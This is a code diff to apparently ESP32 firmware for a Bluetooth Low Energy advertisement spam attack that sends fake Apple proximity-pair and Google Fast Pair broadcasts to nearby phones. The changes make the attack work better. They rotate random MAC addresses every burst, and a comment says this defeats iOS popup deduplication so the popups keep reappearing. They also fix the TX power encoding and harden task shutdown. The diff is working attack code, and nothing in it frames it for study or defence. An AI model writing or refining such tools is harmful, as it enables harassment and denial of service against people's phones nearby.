@@ -187,7 +187,8 @@ static size_t gen_fastpair(uint8_t *buf) {
 
     buf[i++] = 2;
     buf[i++] = 0x0A;
-    buf[i++] = (uint8_t)((esp_random() % 120) - 100); // -100 to +19 dBm
+    // TX power as a signed dBm value in range -100..+19, stored as int8_t.
+    buf[i++] = (uint8_t)(int8_t)(-100 + (int)(esp_random() % 120));
 
     return i; // 14
 }
@@ -243,11 +244,11 @@ static void spam_task(void *arg) {
 
         bool apple = is_apple_type(c->device_type);
 
-
-        if (!apple) {
-            set_random_mac();
-            vTaskDelay(pdMS_TO_TICKS(10));
-        }
+        // Rotate the random address every burst for ALL types. iOS dedupes
+        // proximity-pair popups by source address, so a fixed Apple MAC means
+        // the popup only ever appears once. Always advertise as RANDOM.
+        set_random_mac();
+        vTaskDelay(pdMS_TO_TICKS(10));
 
 
         int t = c->device_type;
@@ -277,6 +278,13 @@ static void spam_task(void *arg) {
             }
         }
 
+
+        // Safety guard: never feed more than the 31-byte legacy adv buffer.
+        if (adv_raw_len > sizeof(adv_raw)) {
+            ESP_LOGE(TAG, "adv payload too long (%u), skipping", (unsigned)adv_raw_len);
+            vTaskDelay(pdMS_TO_TICKS(20));
+            continue;
+        }
 
         int rc = ble_gap_adv_set_data(adv_raw, adv_raw_len);
         if (rc != 0) {
@@ -308,7 +316,7 @@ static void spam_task(void *arg) {
         : (50 + (esp_random() % 50)); // 50-100 ms
 
 
-        uint8_t own_addr_type = apple ? BLE_OWN_ADDR_PUBLIC : BLE_OWN_ADDR_RANDOM;
+        uint8_t own_addr_type = BLE_OWN_ADDR_RANDOM;
 
         rc = ble_gap_adv_start(own_addr_type, NULL, adv_ms, &adv_params, NULL, NULL);
         if (rc != 0) {
@@ -423,21 +431,26 @@ void attack_bt_spam_stop(void) {
 
     running = false;
 
+    // Signal-and-join only. The spam task may be inside ble_gap_adv_*, holding
+    // the NimBLE host mutex; vTaskDelete()-ing it there corrupts the host state
+    // and crashes later. Wait for the task to finish its current iteration and
+    // give the exit semaphore from spam_task itself.
     if (task_exit_sem != NULL) {
-        if (xSemaphoreTake(task_exit_sem, pdMS_TO_TICKS(3000)) != pdTRUE) {
-            ESP_LOGW(TAG, "Task exit timeout, forcing delete");
-            if (task_handle != NULL) {
-                vTaskDelete(task_handle);
-                task_handle = NULL;
-            }
+        if (xSemaphoreTake(task_exit_sem, pdMS_TO_TICKS(5000)) != pdTRUE) {
+            ESP_LOGW(TAG, "Task exit timeout; leaving task to self-terminate");
         }
     } else {
-        vTaskDelay(pdMS_TO_TICKS(500));
-        if (task_handle != NULL) {
-            vTaskDelete(task_handle);
-            task_handle = NULL;
+        while (task_handle != NULL) {
+            vTaskDelay(pdMS_TO_TICKS(50));
         }
     }
+
+    // Tear NimBLE down so the module can be restarted and so the C++
+    // NimBLEDevice-based BT Payload attack can later init the host cleanly.
+    // Without this, a second init asserts on an already-initialized host.
+    nimble_port_stop();
+    nimble_port_deinit();
+    initialized = false;
 
     ESP_LOGI(TAG, "BLE spam stopped");
 }
